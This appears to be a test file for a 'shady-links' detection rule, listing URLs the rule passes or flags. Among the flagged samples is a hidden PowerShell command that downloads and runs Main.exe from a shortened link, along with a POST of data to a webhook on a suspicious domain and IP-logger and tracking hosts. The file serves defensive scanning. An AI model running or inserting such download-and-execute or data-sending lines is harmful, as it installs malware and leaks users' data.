""" Tests for shady-links rule

    OK cases:
      - common/paid domain extensions
        - urls with free domain extensions in other parts of link
      - urls nested within data structures, comments, etc.
    RULEID cases:
      - free domain extensions
      - url shorteners
"""


""" OK: random urls with common/paid domain extensions
"""
def f():
  # ok: shady-links
  _TEST_IP_LIST = ['https://1.1.1.1', 'https://8.8.8.8/test']

def f():
  # ok: shady-links
  goodlink1 = "http://google.com:5000/v1.0/"

def f():
  # ok: shady-links
  goodlink2 = "https://id.atlassian.com/login?continue=https%3A%2F%2Fstart.atlassian.com%2F&application=start"

def f():
  # ok: shady-links
  goodlink3 = "http://xn--n3h.net//"

def f():
  # ok: shady-links
  goodlink4 = "http://192.168.1.1/"

def f():
  # ok: shady-links
  goodlink4 = "http://0.0.0.0:80/"

""" OK: urls with free domain extensions in other parts of link
"""
def f():
  # ok: shady-links
  "https://lov.linkeddata.es/dataset/lov/api/v2/vocabulary/autocomplete?q=%s'%vocab"

def f():
  """
  How about links in long comments?
  # ok: shady-links
  ref:http://bit.ly/2gK6bXK
  """

""" OK: urls nested within data structures, comments, etc.
"""
def f():
  # ok: shady-links
  SECURE_ORIGINS: List[SecureOrigin] = [
      # protocol, hostname, port\n
      # Taken from Chrome\'s list of secure origins (See: http://bit.ly/1qrySKC)
      ("https", "*", "*"),
      ("*", "localhost", "*"),
      ("*", "127.0.0.0/8", "*"),
      ("*", "::1/128", "*"),
      ("file", "*", None),
      # ssh is always secure.
      ("ssh", "*", "*"),
  ]


""" RULEID: url shorteners
"""
def f():
  os.system(
      # ruleid: shady-links
      "powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'"
  )


""" RULEID: free domain extensions
"""
def f():
  # ruleid: shady-links
  req = urllib3.Request("https://grabify.link/E09EIF", headers={"User-Agent": os})

""" RULEID: IPv4
"""
def f():
  # ruleid: shady-links
  req = urllib3.Request("https://128.0.0.1/foo.exe", headers={"User-Agent": os})

def f():
  # ruleid: shady-links
  req = urllib3.Request("https://root@1.2.3.4", headers={"User-Agent": os})

def f():
  # ruleid: shady-links
  req = urllib3.Request("https://root@12.34.56.78:42", headers={"User-Agent": os})

def f():
  # ruleid: shady-links
  req = urllib3.Request("https://root@123.234.156.178", headers={"User-Agent": os})

def f():
  # ruleid: shady-links
  req = urllib3.Request("https://root:pw@128.0.0.1", headers={"User-Agent": os})

""" RULEID: IPv6
"""
def f():
  # ruleid: shady-links
  req = urllib3.Request("https://[::1]/foo.exe", headers={"User-Agent": os})

def f():
  # ruleid: shady-links
  req = urllib3.Request("https://[::abcd:1]:42", headers={"User-Agent": os})

def f():
  # ruleid: shady-links
  req = urllib3.Request("https://[12aB::1]", headers={"User-Agent": os})

def f():
  # ruleid: shady-links
  req = urllib3.Request("https://[12ab:12AB:12ab:12BA:12ab:12Ab:12aB:12Ab]", headers={"User-Agent": os})

def f():
  # ruleid: shady-links
  req = urllib3.Request("https://root@[1234:AbCd:1234::fedc:1]", headers={"User-Agent": os})

def f():
  # ruleid: shady-links
  req = urllib3.Request("https://root:pw@[::1]", headers={"User-Agent": os})

def f():
  # ok: shady-links
  config.proxy = 'http://' + config.proxy
      
  if (config.proxy.indexOf('@') != -1):
    proxy = (url.parse(config.proxy).auth).split(':')
    options.proxy_user = proxy[0]

def f():
  # ok: shady-links
  self.image_url = "https://" + self.image_url[7]

def f():
  request(
      # ruleid: shady-links
      url="http://us.dslab.pw/webhook.php",
      method="POST",
      data=json.dumps(data).encode("utf-8", errors="ignore"),
      headers=headers,
  )

  def f():
    auth_config = KubernetesUserPasswordConfig(
                username=kube_config.username,
                password=kube_config.password,
                server=kube_config.host,
                certificate_authority=base64.urlsafe_b64encode(
                    open(kube_config.ssl_ca_cert, "rb").read()
                ).decode("utf-8")
                if kube_config.ssl_ca_cert
                else None,
                # ok: shady-links
                cluster_name=kube_config.host.strip("https://").split(":")[0],
                insecure=kube_config.verify_ssl is False,
            )

  def f():
    # ruleid: shady-links
    trackingServiceUrl = 'https://b.alt-h7-eoj8gqk1.workers.dev/track'

def f():
    # ok: shady-links
    trackingServiceUrl = 'https//discord.com/invite/u9zUjWbbQ'

def f():
    # ruleid: shady-links
    trackingUrl = "qkrfaniquihoswritqaqwbg5r4l072qp7.oast.fun/track"
